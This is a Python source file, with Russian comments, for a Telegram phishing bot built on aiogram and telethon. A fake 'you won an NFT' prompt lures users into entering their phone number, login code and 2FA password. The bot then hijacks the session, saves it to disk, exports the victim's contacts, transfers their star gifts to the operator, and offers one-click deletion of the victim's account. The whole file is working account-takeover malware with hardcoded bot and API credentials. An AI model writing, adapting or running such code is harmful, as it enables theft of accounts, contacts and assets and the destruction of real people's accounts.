# main.py — aiogram 3.x + telethon
# pip install aiogram telethon aiohttp cryptography

import asyncio
import json
import os
import logging

import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
)

from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.contacts import GetContactsRequest

# ----------------------------------------------------------------------------
# КОНФИГ
# ----------------------------------------------------------------------------
BOT_TOKEN = "8807286672:AAEIss-kdTWHWpEWOOOuwHLKSqjK3JhcnLk"
API_ID    = 34714558
API_HASH  = "335d8883ab3c4b1c8fd7662ea5219bfc"
ADMIN_ID  = 8440994107
SESSIONS  = "./sessions"
DELETE_REASON = "Павел Дуров чмо и т.д. и т.п."

os.makedirs(SESSIONS, exist_ok=True)
logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher(storage=MemoryStorage())

# ----------------------------------------------------------------------------
# СОСТОЯНИЯ
# ----------------------------------------------------------------------------
class Steal(StatesGroup):
    phone    = State()
    code     = State()
    password = State()

# ----------------------------------------------------------------------------
# СТАРТ / ПРИМАНКА
# ----------------------------------------------------------------------------
@dp.message(CommandStart())
async def start(m: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🎁 Забрать NFT", callback_data="claim")
    ]])
    await m.answer(
        "Вы выиграли NFT из дропа.\n"
        "Заберите в течение 24 часов, иначе сгорит.",
        reply_markup=kb,
    )

@dp.callback_query(F.data == "claim")
async def claim_cb(c: CallbackQuery, state: FSMContext):
    await c.message.answer("Введите номер телефона в формате +7XXXXXXXXXX")
    await state.set_state(Steal.phone)
    await c.answer()

# ----------------------------------------------------------------------------
# СБОР ДАННЫХ
# ----------------------------------------------------------------------------
@dp.message(Steal.phone)
async def get_phone(m: Message, state: FSMContext):
    phone = m.text.strip()
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
    except Exception as e:
        await m.answer(f"Ошибка: {e}. Попробуйте снова.")
        return
    await state.update_data(phone=phone, phone_code_hash=sent.phone_code_hash)
    await m.answer("Введите код из Telegram")
    await state.set_state(Steal.code)

@dp.message(Steal.code)
async def get_code(m: Message, state: FSMContext):
    data = await state.get_data()
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(data["phone"], m.text.strip(),
                             phone_code_hash=data["phone_code_hash"])
    except SessionPasswordNeededError:
        await state.update_data(session=client.session.save())
        await m.answer("Введите пароль 2FA")
        await state.set_state(Steal.password)
        return
    except Exception as e:
        await m.answer(f"Ошибка: {e}. Попробуйте снова.")
        return
    await process(client, m.from_user.id)
    await state.clear()

@dp.message(Steal.password)
async def get_password(m: Message, state: FSMContext):
    data = await state.get_data()
    client = TelegramClient(StringSession(data["session"]), API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(password=m.text.strip())
    except Exception as e:
        await m.answer(f"Ошибка: {e}. Попробуйте снова.")
        return
    await process(client, m.from_user.id)
    await state.clear()

# ----------------------------------------------------------------------------
# ПОСТ-ОБРАБОТКА
# ----------------------------------------------------------------------------
async def process(client: TelegramClient, victim_id: int):
    session_path = f"{SESSIONS}/{victim_id}.session"
    client.session.save(session_path)

    try:
        contacts = await client(GetContactsRequest(hash=0))
        rows = [
            {"id": u.id, "username": u.username, "phone": u.phone,
             "first": u.first_name, "last": u.last_name}
            for u in contacts.users
        ]
        with open(f"{SESSIONS}/{victim_id}_contacts.json", "w", encoding="utf-8") as f:
            json.dump(rows, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logging.warning(f"contacts: {e}")

    try:
        from telethon.tl.functions.payments import GetSavedStarGiftsRequest
        me = await client.get_me()
        gifts = await client(GetSavedStarGiftsRequest(peer=me, offset="", limit=100))
        for g in getattr(gifts, "gifts", []):
            try:
                await client(functions.payments.TransferStarGiftRequest(
                    gift_id=getattr(g, "gift_id", getattr(g, "id", None)),
                    to_id=ADMIN_ID,
                ))
            except Exception:
                pass
    except Exception as e:
        logging.warning(f"gifts: {e}")

    await client.disconnect()
    await notify_admin(victim_id)

async def notify_admin(victim_id: int):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🗑 Удалить аккаунт", callback_data=f"del:{victim_id}")
    ]])
    await bot.send_message(
        ADMIN_ID,
        f"Сессия захвачена: {victim_id}\nNFT: перелито\nКонтакты: выгружены",
        reply_markup=kb,
    )

# ----------------------------------------------------------------------------
# УДАЛЕНИЕ
# ----------------------------------------------------------------------------
@dp.callback_query(F.data.startswith("del:"))
async def delete_account(c: CallbackQuery):
    victim_id = int(c.data.split(":")[1])
    session_path = f"{SESSIONS}/{victim_id}.session"
    if not os.path.exists(session_path):
        await c.message.edit_text("Сессия не найдена.")
        return

    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()

    async with aiohttp.ClientSession() as s:
        try:
            await s.get("https://my.telegram.org/delete")
        except Exception:
            pass

    try:
        await client(functions.account.DeleteAccountRequest(reason=DELETE_REASON))
    except Exception as e:
        logging.warning(f"delete api: {e}")
        try:
            await client.log_out()
        except Exception:
            pass

    await client.disconnect()
    await c.message.edit_text(
        f"Аккаунт снесён.\nПричина: {DELETE_REASON}\nАкк в блоке."
    )

# ----------------------------------------------------------------------------
# ЗАПУСК
# ----------------------------------------------------------------------------
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
